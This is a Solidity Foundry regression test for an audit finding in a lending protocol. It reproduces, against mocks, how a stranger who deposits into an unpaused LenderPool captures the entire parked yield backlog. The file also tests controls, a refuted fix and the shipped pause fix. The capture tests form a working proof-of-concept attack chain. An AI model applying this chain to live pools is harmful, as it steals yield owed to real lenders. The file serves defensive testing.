// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AUDIT ROUND 40. An open finding, executed:
// "The LenderPool is open from the block it is deployed. Capture chain not executed."
// This file EXECUTES the capture chain, and it is COMMITTED as a regression rather than
// preserved as evidence. The reason is the shape of the fix: D7 is closed by one line of
// deploy SCRIPT (`d.pool.pause()` in `DeployBase._wire`), which nothing about the deployed
// bytecode enforces and which a future edit to the script can silently drop. So the capture
// has to be able to go red again.
//
// **Every test below that needs the pre-fix world reconstructs it explicitly by calling
// `_reopenAsBeforeTheFix`, and that call is itself the tripwire**: it is a `pool.unpause()`,
// so if the shipped pause is ever removed it reverts `ExpectedPause` and these tests fail
// loudly instead of quietly measuring a world that no longer exists.

import {Test, console} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";

import {DeployBase} from "../script/DeployBase.sol";
import {Config} from "../src/Config.sol";
import {EpochHarvester} from "../src/EpochHarvester.sol";
import {LenderPool} from "../src/LenderPool.sol";
import {IDexFiBond} from "../src/interfaces/IDexFiBond.sol";
import {IDexFiFarm} from "../src/interfaces/IDexFiFarm.sol";
import {MockBond} from "./mocks/MockBond.sol";
import {MockFarm} from "./mocks/MockFarm.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";

contract R40D7CaptureTest is Test, DeployBase {
    address internal treasury = makeAddr("treasury");
    address internal keeper = makeAddr("keeper");
    address internal navConfirmer = makeAddr("navConfirmer");
    address internal attacker = makeAddr("attacker");
    address internal honestLender = makeAddr("honestLender");

    MockUSDC internal usdc;
    MockBond internal bond;
    MockFarm internal farm;

    uint256 internal constant FLOAT = 10_000e6;
    uint256 internal constant LOAN = 500e6;
    uint256 internal constant BONDS = 100;
    uint256 internal constant NAV = 25.15e8;
    uint256 internal constant EPOCH_YIELD = 1_000e6;

    function setUp() public {
        usdc = new MockUSDC();
        bond = new MockBond();
        farm = new MockFarm(bond, usdc);
        bond.setRewardPool(address(farm));
        vm.chainId(ANVIL_CHAIN_ID);
    }

    function _externals() internal view returns (Externals memory) {
        return Externals({
            bond: IDexFiBond(address(bond)),
            farm: IDexFiFarm(address(farm)),
            usdc: IERC20(address(usdc))
        });
    }

    function _paramsOwnedHere() internal view returns (GovParams memory p) {
        p = GovParams({
            owner: address(this),
            yieldRecipient: treasury,
            keeper: keeper,
            navConfirmer: navConfirmer,
            protocolFeeWallet: treasury,
            guardian: address(0)
        });
    }

    function exposedWirePhase4(Deployed memory d) external {
        _wirePhase4(d);
    }

    function exposedAssertWiring(Deployed memory d, GovParams memory p) external view {
        _assertWiring(d, p);
    }

    function exposedAssertPhase4Wiring(Deployed memory d, GovParams memory p) external view {
        _assertPhase4Wiring(d, p);
    }

    function _liveProtocol() internal returns (Deployed memory d, address borrower) {
        d = _deployProtocol(_externals(), _paramsOwnedHere(), address(this));

        usdc.mint(address(this), FLOAT);
        usdc.approve(address(d.liquidity), FLOAT);
        d.liquidity.fund(FLOAT);
        d.oracle.bootstrapNav(NAV);

        bond.setWhitelisted(address(farm), true);
        bond.setWhitelisted(address(d.adapter), true);

        borrower = makeAddr("borrower");
        bond.mint(borrower, BONDS);
        vm.startPrank(borrower);
        bond.setApprovalForAll(address(d.vault), true);
        d.vault.depositBonds(BONDS);
        vm.stopPrank();
    }

    /// @dev Reconstruct the world as it shipped BEFORE the round-40 fix: an open pool.
    ///      **This is a tripwire, not a convenience.** `unpause` carries OZ's `whenPaused`, so
    ///      the moment `DeployBase._wire` stops shipping the pool paused this reverts
    ///      `ExpectedPause` and every capture below goes red - which is the only thing keeping a
    ///      script-side fix honest, since no deployed bytecode enforces it.
    function _reopenAsBeforeTheFix(Deployed memory d) internal {
        assertTrue(d.pool.paused(), "the shipped state is PAUSED - if this fails the fix is gone");
        d.pool.unpause();
    }

    function _enter(LenderPool pool, address who, uint256 amount) internal {
        usdc.mint(who, amount);
        vm.startPrank(who);
        usdc.approve(address(pool), amount);
        pool.deposit(amount, who);
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 1. THE WINDOW.
    // ─────────────────────────────────────────────────────────────────────────

    /// @dev Reproduces DeployBase._deployProtocol's `d.pool = new LenderPool(e.usdc, deployer)`
    ///      and reads the pool in that same block, before any wiring call.
    ///
    ///      **Unchanged by the round-40 fix, deliberately.** The fix is one line of deploy
    ///      SCRIPT; the CONTRACT still constructs unpaused with a live cap, because pausing in
    ///      the constructor was measured at +162 initcode and turns roughly 190 fixtures red.
    ///      So this still asserts `SHIPS UNPAUSED` and that remains true of the type. What
    ///      closed is the deployment, not the constructor - which is the whole reason
    ///      `_reopenAsBeforeTheFix` has to be a tripwire.
    function test_R40_D7_window_openInTheBlockItIsDeployed() public {
        LenderPool pool = new LenderPool(IERC20(address(usdc)), address(this));

        assertEq(pool.owner(), address(this), "owner is the deployer");
        assertEq(pool.creditManager(), address(0), "unwired: no manager");
        assertEq(pool.epochHarvester(), address(0), "unwired: no harvester");
        assertEq(pool.guardian(), address(0), "unwired: no guardian");
        assertFalse(pool.paused(), "SHIPS UNPAUSED");
        assertEq(pool.depositCap(), Config.DEFAULT_LENDER_POOL_DEPOSIT_CAP, "live cap");
        assertEq(pool.maxDeposit(attacker), Config.DEFAULT_LENDER_POOL_DEPOSIT_CAP, "door is open");

        usdc.mint(attacker, 1_000e6);
        vm.startPrank(attacker);
        usdc.approve(address(pool), 1_000e6);
        uint256 shares = pool.deposit(1_000e6, attacker);
        vm.stopPrank();

        assertGt(shares, 0, "a stranger minted shares in the deploy block");
        assertEq(pool.balanceOf(attacker), pool.totalSupply(), "and holds 100% of supply");
        console.log("window: stranger shares", shares);
    }

    /// @notice **THE PRIMARY REGRESSION. The window is now shut by the deploy path.**
    /// @dev 🟥 **This test used to be `test_R40_D7_window_neverCloses` and asserted the opposite**
    ///      - `assertFalse(d.pool.paused())`, a stranger depositing, and `_assertWiring` passing
    ///      over the top of it. Inverted rather than deleted, because "nothing on the deploy path
    ///      shuts it" is exactly the claim that must be able to fail again.
    function test_R40_D7_theDeployPathNowShutsTheWindow() public {
        Deployed memory d = _deployProtocol(_externals(), _paramsOwnedHere(), address(this));

        assertTrue(d.pool.paused(), "the whole deploy script now leaves the pool shut");
        assertEq(d.pool.maxDeposit(attacker), 0, "and no stranger can enter");

        usdc.mint(attacker, 1_000e6);
        vm.startPrank(attacker);
        usdc.approve(address(d.pool), 1_000e6);
        vm.expectRevert(Pausable.EnforcedPause.selector);
        d.pool.deposit(1_000e6, attacker);
        vm.stopPrank();

        // And the post-condition now asserts the shipped state rather than printing it.
        this.exposedAssertWiring(d, _paramsOwnedHere());
        assertEq(d.pool.totalSupply(), 0, "nobody is in the pool the log calls dormant");
    }

    /// @dev Cap squat: 25,000 USDC closes the pool to everybody else and cannot be evicted.
    function test_R40_D7_capSquatShutsOutEveryoneElse() public {
        Deployed memory d = _deployProtocol(_externals(), _paramsOwnedHere(), address(this));
        _reopenAsBeforeTheFix(d);

        uint256 cap = Config.DEFAULT_LENDER_POOL_DEPOSIT_CAP;
        _enter(d.pool, attacker, cap);

        assertEq(d.pool.maxDeposit(honestLender), 0, "the intended beta cannot get in");

        d.pool.setDepositCap(Config.GLOBAL_BORROW_CAP_MAX);
        assertGt(d.pool.maxDeposit(honestLender), 0, "raising the cap reopens for others");
        assertEq(d.pool.balanceOf(attacker), d.pool.totalSupply(), "but the squatter is still 100%");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 2. THE CAPTURE CHAIN.
    // ─────────────────────────────────────────────────────────────────────────

    function _accrueBacklog(Deployed memory d, address borrower, uint256 epochs) internal {
        vm.prank(borrower);
        d.credit.borrow(LOAN);

        for (uint256 i = 0; i < epochs; i++) {
            vm.warp(block.timestamp + Config.MIN_EPOCH_GAP + 1);
            farm.setPendingYield(address(d.adapter), EPOCH_YIELD);
            d.harvester.harvest();
        }
    }

    function _settleAndSwitch(Deployed memory d, address borrower) internal {
        // Apply the streamed borrower-leg credit to the stored debt first: `currentDebtOf`
        // nets pending yield off lazily, but `_wirePhase4` refuses on the STORED `totalDebt`.
        d.credit.settle(borrower);
        uint256 debt = d.credit.debtOf(borrower);
        if (debt != 0) {
            usdc.mint(borrower, debt);
            vm.startPrank(borrower);
            usdc.approve(address(d.credit), debt);
            d.credit.repay(debt);
            vm.stopPrank();
        }
        this.exposedWirePhase4(d);
    }

    /// @notice THE CAPTURE.
    function test_R40_D7_capture_strangerTakesTheEntireBacklog() public {
        (Deployed memory d, address borrower) = _liveProtocol();
        _reopenAsBeforeTheFix(d);

        uint256 stake = 1_200e6;
        _enter(d.pool, attacker, stake);

        assertEq(d.credit.liquiditySource(), address(d.liquidity), "the treasury funds the book");
        assertEq(d.pool.outstandingPrincipal(), 0, "the attacker's cash is lending to nobody");

        _accrueBacklog(d, borrower, 4);

        uint256 backlog = d.harvester.pendingLenderYield();
        assertGt(backlog, 0, "a backlog has to exist or this proves nothing");
        console.log("backlog parked while the pool was unwired:", backlog);
        assertEq(d.harvester.lenderPool(), address(0), "parked, not paid");

        _settleAndSwitch(d, borrower);
        assertEq(d.harvester.lenderPool(), address(d.pool), "the pointer is live");

        vm.prank(attacker);
        d.harvester.flushLenderYield();
        assertEq(d.harvester.pendingLenderYield(), 0, "the whole backlog was delivered");

        assertEq(d.pool.balanceOf(attacker), d.pool.totalSupply(), "100% of supply");

        uint256 endsAt = d.pool.yieldStreamEndsAt();
        console.log("stream length (s):", endsAt - block.timestamp);

        vm.warp(block.timestamp + 400 days);
        uint256 shares = d.pool.maxRedeem(attacker);
        assertEq(shares, d.pool.balanceOf(attacker), "the whole position is redeemable");
        vm.prank(attacker);
        uint256 out = d.pool.redeem(shares, attacker, attacker);

        console.log("attacker put in  :", stake);
        console.log("attacker took out:", out);
        assertGt(out, stake, "the capture is profitable");
        console.log("profit           :", out - stake);
        console.log("backlog          :", backlog);
        assertApproxEqAbs(out - stake, backlog, 10, "profit == the captured backlog");
    }

    /// @notice REFUTATION / BOUND: a backlog larger than the pool's capital is refused, so the
    ///         "one cent takes the lot" shape is closed and the take is bounded by real capital.
    function test_R40_D7_refuted_oneCentDoesNotTakeTheBacklog() public {
        (Deployed memory d, address borrower) = _liveProtocol();
        _reopenAsBeforeTheFix(d);

        uint256 dust = 10_000; // 0.01 USDC = exactly MIN_SUPPLY_FOR_YIELD worth of shares
        _enter(d.pool, attacker, dust);

        _accrueBacklog(d, borrower, 4);
        uint256 backlog = d.harvester.pendingLenderYield();
        _settleAndSwitch(d, borrower);

        // Drive the pool directly from the harvester to read the refusal reason.
        vm.prank(address(d.harvester));
        vm.expectRevert(
            abi.encodeWithSelector(LenderPool.YieldExceedsCapital.selector, backlog, dust)
        );
        d.pool.distributeYield(backlog);

        // And through the real permissionless door the flush delivers nothing and says so.
        vm.prank(attacker);
        vm.expectRevert(EpochHarvester.FlushDeliveredNothing.selector);
        d.harvester.flushLenderYield();
        assertEq(d.harvester.pendingLenderYield(), backlog, "still parked");
        console.log("refused: backlog", backlog, "against capital", dust);
    }

    /// @notice CONTROL / NEUTER. Does the DEPLOY WINDOW buy the attacker anything? Identical
    ///         chain, except the attacker deposits only AFTER the switchover, in the block before
    ///         the flush. If the profit is the same, D7's headline ("open from the block it is
    ///         deployed") is not where the value leaks - the leak is that the pool is open at the
    ///         flush instant at all.
    function test_R40_D7_control_theDeployWindowIsNotRequired() public {
        (Deployed memory d, address borrower) = _liveProtocol();
        _reopenAsBeforeTheFix(d);

        _accrueBacklog(d, borrower, 4);
        uint256 backlog = d.harvester.pendingLenderYield();
        _settleAndSwitch(d, borrower);

        // Only now, one block after the owner's switchover, does the attacker appear.
        uint256 stake = 1_200e6;
        _enter(d.pool, attacker, stake);

        vm.prank(attacker);
        d.harvester.flushLenderYield();
        assertEq(d.harvester.pendingLenderYield(), 0, "delivered to a just-in-time depositor");

        uint256 endsAt = d.pool.yieldStreamEndsAt();
        console.log("stream ends at   :", endsAt);
        console.log("stream length (s):", endsAt - block.timestamp);

        vm.warp(block.timestamp + 400 days);
        uint256 shares = d.pool.maxRedeem(attacker);
        vm.prank(attacker);
        uint256 out = d.pool.redeem(shares, attacker, attacker);

        console.log("JIT attacker in  :", stake);
        console.log("JIT attacker out :", out);
        console.log("JIT profit       :", out - stake);
        console.log("backlog          :", backlog);
        assertApproxEqAbs(out - stake, backlog, 10, "the deploy window buys nothing extra");
    }

    /// @notice CONTROL. An honest lender already in the pool dilutes the capture pro rata, which
    ///         is what makes "first in an unwired pool" the whole of the attacker's edge.
    function test_R40_D7_control_anHonestLenderPresentDilutesTheCapture() public {
        (Deployed memory d, address borrower) = _liveProtocol();
        _reopenAsBeforeTheFix(d);

        _enter(d.pool, honestLender, 1_200e6);
        _enter(d.pool, attacker, 1_200e6);

        _accrueBacklog(d, borrower, 4);
        uint256 backlog = d.harvester.pendingLenderYield();
        _settleAndSwitch(d, borrower);

        vm.prank(attacker);
        d.harvester.flushLenderYield();

        vm.warp(block.timestamp + 400 days);
        uint256 shares = d.pool.maxRedeem(attacker);
        vm.prank(attacker);
        uint256 out = d.pool.redeem(shares, attacker, attacker);
        console.log("half-share profit:", out - 1_200e6);
        console.log("backlog          :", backlog);
        assertApproxEqAbs(out - 1_200e6, backlog / 2, 10, "exactly half the backlog");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // 3. THE PROPOSED FIX, SIGN-CHECKED.
    // ─────────────────────────────────────────────────────────────────────────

    /// @notice REFUTATION OF THE PRESCRIBED FIX. The prescription on this open finding was
    ///         "`pool.pause()` in `_phase4PauseCalls`, `unpause` as a trailing leg, assert it".
    ///         Executed here in exactly that shape. It does NOT close the capture: the flush is a
    ///         separate permissionless call that necessarily happens AFTER the trailing unpause,
    ///         so the just-in-time depositor simply arrives one block later and takes the same
    ///         amount. The pause is on the wrong side of the only door that matters.
    function test_R40_D7_refuted_prescribedPhase4PauseDoesNotCloseIt() public {
        (Deployed memory d, address borrower) = _liveProtocol();
        _reopenAsBeforeTheFix(d);

        _accrueBacklog(d, borrower, 4);
        uint256 backlog = d.harvester.pendingLenderYield();

        // The prescription: pause the pool across the switchover window...
        d.pool.pause();
        _settleAndSwitch(d, borrower);
        // ...and unpause as a trailing leg of the same batch.
        d.pool.unpause();
        assertFalse(d.pool.paused(), "the prescribed batch ends unpaused");

        // The attacker arrives after the batch, exactly as before.
        uint256 stake = 1_200e6;
        _enter(d.pool, attacker, stake);
        vm.prank(attacker);
        d.harvester.flushLenderYield();

        vm.warp(block.timestamp + 400 days);
        uint256 shares = d.pool.maxRedeem(attacker);
        vm.prank(attacker);
        uint256 out = d.pool.redeem(shares, attacker, attacker);

        console.log("under the prescribed fix, profit:", out - stake);
        console.log("backlog                         :", backlog);
        assertApproxEqAbs(out - stake, backlog, 10, "the prescribed fix changes nothing");
    }

    /// @dev The deposit cap cannot be used to close the pool instead: zero is refused, so there is
    ///      no "closed" cap setting and `pause` is the only lever that exists.
    function test_R40_D7_theCapCannotBeUsedToCloseThePool() public {
        Deployed memory d = _deployProtocol(_externals(), _paramsOwnedHere(), address(this));
        _reopenAsBeforeTheFix(d);
        vm.expectRevert(LenderPool.ZeroAmount.selector);
        d.pool.setDepositCap(0);
        assertGt(d.pool.maxDeposit(attacker), 0, "and the door is still open");
    }

    /// @notice The shipped pause closes entry and leaves the exit correct.
    /// @dev 🟥 **This test used to PROPOSE the fix and now READS it.** It deposited first, then
    ///      called `d.pool.pause()` itself as "the proposed extra deploy leg". That line is gone:
    ///      `DeployBase._wire` performs it, so calling it here would revert `EnforcedPause`. The
    ///      honest lender is seeded through the door the operator really uses - unpause, seed,
    ///      re-shut - which is also the sequence the seed-and-flush operation has to take.
    function test_R40_D7_fix_pauseAtDeployClosesTheDoor() public {
        Deployed memory d = _deployProtocol(_externals(), _paramsOwnedHere(), address(this));

        assertTrue(d.pool.paused(), "the deploy path shipped it shut");

        // The operator's own seeding door, which is owner-gated and deliberate.
        d.pool.unpause();
        _enter(d.pool, honestLender, 1_000e6);
        d.pool.pause();

        assertEq(d.pool.maxDeposit(attacker), 0, "entry closed");
        usdc.mint(attacker, 1_000e6);
        vm.startPrank(attacker);
        usdc.approve(address(d.pool), 1_000e6);
        vm.expectRevert(Pausable.EnforcedPause.selector);
        d.pool.deposit(1_000e6, attacker);
        vm.stopPrank();

        uint256 lenderShares = d.pool.balanceOf(honestLender);
        vm.prank(honestLender);
        uint256 out = d.pool.redeem(lenderShares, honestLender, honestLender);
        assertApproxEqAbs(out, 1_000e6, 10, "an existing lender can still leave while paused");

        this.exposedAssertWiring(d, _paramsOwnedHere());
    }

    function test_R40_D7_fix_pausedPoolStillSwitchesOverAndPays() public {
        (Deployed memory d, address borrower) = _liveProtocol();
        assertTrue(d.pool.paused(), "shipped shut - no test-side pause is needed any more");

        _accrueBacklog(d, borrower, 4);
        uint256 backlog = d.harvester.pendingLenderYield();

        _settleAndSwitch(d, borrower);
        assertTrue(d.pool.paused(), "the switchover does not unpause the pool");
        // The deploy post-condition must tolerate the fix, or the fix is unshippable.
        this.exposedAssertPhase4Wiring(d, _paramsOwnedHere());

        // The atomic batch: unpause, seed the intended cohort, flush - one operation.
        d.pool.unpause();
        _enter(d.pool, honestLender, 2_000e6);

        d.harvester.flushLenderYield();
        assertEq(d.harvester.pendingLenderYield(), 0, "the backlog reaches the intended cohort");
        assertEq(d.pool.balanceOf(honestLender), d.pool.totalSupply(), "100% to the beta lender");
        console.log("backlog delivered to the intended cohort:", backlog);
    }
}
